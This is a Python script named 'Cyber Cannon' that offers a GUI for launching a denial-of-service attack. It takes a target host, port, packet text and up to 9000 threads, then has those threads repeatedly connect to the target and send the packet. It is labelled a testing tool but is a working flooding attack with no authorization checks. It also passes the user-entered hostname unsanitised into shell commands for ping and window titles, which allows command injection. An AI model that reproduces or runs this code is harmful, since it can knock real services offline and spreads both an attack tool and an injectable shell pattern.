#
# Cyber Cannon: Quick and easy DoS attack (Denial of Service) testing python script.
#
# Coded by parsa kazazi
# GitHub: https://github.com/parsa-kazazi


import tkinter
from tkinter import *
from tkinter import messagebox
import sys
import os
import socket
from threading import Thread
from queue import Queue
import time
import subprocess


font = (None, "12")

info = "[*] "
good = "[+] "
error = "[!] "

stop = False

def now_time(): return time.strftime("%H:%M:%S")

if os.name == "nt":
    os.system("title Cyber Cannon")
    os.system("color a")
elif os.name == "posix":
    os.system("printf '\033]2;Cyber Cannon\a'")
    sys.stdout.write("\033[92m")

print(r"""
    ______      __                 ______                            
   / ____/_  __/ /_  ___  _____   / ____/___ _____  ____  ____  ____ 
  / /   / / / / __ \/ _ \/ ___/  / /   / __ `/ __ \/ __ \/ __ \/ __ \
 / /___/ /_/ / /_/ /  __/ /     / /___/ /_/ / / / / / / / /_/ / / / /
 \____/\__, /_.___/\___/_/      \____/\__,_/_/ /_/_/ /_/\____/_/ /_/ 
      /____/

    Quick and easy Denial of Service attack

""")

time.sleep(1)


def start():
    global start_window

    start_window = Tk()
    start_window.title("Cyber Cannon")
    start_window.geometry("500x350")

    global entry1, entry2, entry3, packet_txt

    Label(start_window, text="Target host: ", font=font).pack(anchor=W)
    entry1 = Entry(start_window, font=font)
    entry1.pack()
    Label(start_window, text="Target Port: ", font=font).pack(anchor=W)
    entry2 = Entry(start_window, font=font)
    entry2.pack()
    Label(start_window, text="Turbo: ", font=font).pack(anchor=W)
    entry3 = Entry(start_window, font=font)
    entry3.pack()
    Label(start_window, text="Packet: ", font=font).pack(anchor=W)
    packet_txt = Text(start_window, height=7)
    packet_txt.pack()
    Button(start_window, text="START", command=main, font=font).pack(anchor=CENTER)

    start_window.mainloop()


def main():
    global target_host, target_ip, port, turbo_count, packet, root

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # to create connection

    try:
        target_host = entry1.get()
        port = entry2.get()
        turbo_count = int(entry3.get())
        packet = packet_txt.get(0.0, END)

        if port == "":
            port = 80
        else:
            port = int(port)
    except:
        messagebox.showerror("Error", "Invalid input.")
        print(error + "Invalid input.\n")
        exit()

    if turbo_count == 0:
        messagebox.showerror("Error", "Turbo should not be 0.")
        print(error + "Turbo should not be 0.\n")
        exit()
    elif turbo_count > 9000:
        messagebox.showerror("Error", "Turbo should not be large than 9000.")
        print(error + "Turbo should not be large than 9000.\n")
        exit()
    elif target_host.isspace():
        messagebox.showerror("Error", "Target should not empty.")
        print(error + "Target should not empty.\n")
        exit()
    elif packet.isspace():
        messagebox.showerror("Error", "Packet should not empty.")
        print(error + "Packet should not empty.\n")
        exit()

    try:
        target_ip = socket.gethostbyname(target_host)  # get target IP address
    except Exception as error_msg:
        messagebox.showerror("Error", str(error_msg))
        print(error + str(error_msg) + "\n")
        exit()

    start_window.destroy()

    root = Tk()
    root.withdraw()

    print(info + "Checking connection to " + target_host + " port " + str(port) + " ...")
    time.sleep(1)

    try:
        sock.connect((target_ip, port))  # check the connection
        sock.settimeout(1)
    except Exception as error_msg:
        messagebox.showerror("Error", str(error_msg))
        print(error + str(error_msg) + "\n")
        exit()
    else:
        time.sleep(1)
        print(good + "Connected")

        if os.name == "nt":
            param = "-n"
        elif os.name == "posix":
            param = "-c"

        ping_output = subprocess.getoutput("ping " + target_host + " " + param + " 1")
        ping_output = ping_output.split("\n")
        ping_output = ping_output[1]

        print(info + "Ping: " + ping_output + "\n")

    time.sleep(1)

    print(info + "Target host: " + target_host)
    print(info + "Target port: " + str(port))
    sys.stdout.write(info + "Turbo count: " + str(turbo_count))

    if turbo_count >= 1000:
        sys.stdout.write(" [DANGEROUS]")

    print("\n" + info + "Packet: " + packet)

    print("\n" + info + "For stop attack press CTRL+C.\n")
    print(info + now_time() + " ==> Starting attack...")
    time.sleep(5)

    if os.name == "nt":
        os.system("title Attacking to " + target_host + ":" + str(port))
    elif os.name == "posix":
        os.system("printf '\033]2;Attacking to " + target_host + ":" + str(port) + "\a'")

    print(info + now_time() + " ==> Attack started.")
    time.sleep(1)

    attack()


q = Queue()


def send_packet(item):
    # send packet to target ip

    while True:
        if stop:
            pass
        else:
            try:
                attack_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                attack_sock.connect((target_ip, port))

                if attack_sock.sendto(bytes(packet, "UTF-8"), (target_ip, port)):
                    attack_sock.shutdown(1)
                    print(good + now_time() + " ==> Packet Sent to " + target_host + " trough port " + str(port))
                else:
                    sock.shutdown(1)
                    print(error + now_time() + " ==> Shut down")
                time.sleep(0.1)
            except Exception as error_msg:
                print(error + now_time() + " ==> " + str(error_msg))
                time.sleep(0.1)


def run():
    while True:
        item = q.get()
        send_packet(item)
        q.task_done()


def attack():
    while True:
        try:
            for thread in range(turbo_count):
                if stop:
                    pass
                else:
                    thr = Thread(target=run, daemon=True)
                    thr.start()

            item = 0

            while True:
                if item > 1800:
                    item = 0
                    time.sleep(0.1)

                item += 1
                q.put(item)

            q.join()
        except KeyboardInterrupt:
            stop_attack()


def stop_attack():
    global stop
    stop = True

    print(info + now_time() + " ==> Attack stopped.")

    question = messagebox.askyesno("Attack stopped", "Finish attack and exit?")

    if question:
        print(info + now_time() + " ==> Attack finished.\n")
        exit()
    elif not question:
        root.update()
        stop = False
        attack()
    else:
        exit()


start()
